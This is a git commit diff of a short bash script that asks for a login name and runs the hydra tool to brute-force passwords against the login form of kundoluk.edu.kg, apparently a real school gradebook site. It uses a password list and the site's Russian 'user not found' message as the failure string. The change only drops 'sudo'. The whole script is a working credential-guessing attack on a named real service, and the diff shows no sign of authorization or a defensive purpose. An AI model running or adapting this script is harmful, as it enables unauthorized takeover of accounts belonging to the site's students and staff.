dbe431e15671048ec5a511951a3d87cddff4d985
zaqSmg <63791009+zaqSmg@users.noreply.github.com>
2022-10-20 21:41:43 +0600

    Update kundoluk.sh

--- kundoluk.sh
+++ kundoluk.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 echo "Enter Your Login"
 read login
-sudo hydra -l $login -P pass.txt kundoluk.edu.kg https-post-form "/account/login:login=^USER^&password=^PASS^&language=ru&type=default:Пользователя с такими данными не найдено." -vV -o file.txt
+hydra -l $login -P pass.txt kundoluk.edu.kg https-post-form "/account/login:login=^USER^&password=^PASS^&language=ru&type=default:Пользователя с такими данными не найдено." -vV -o file.txt
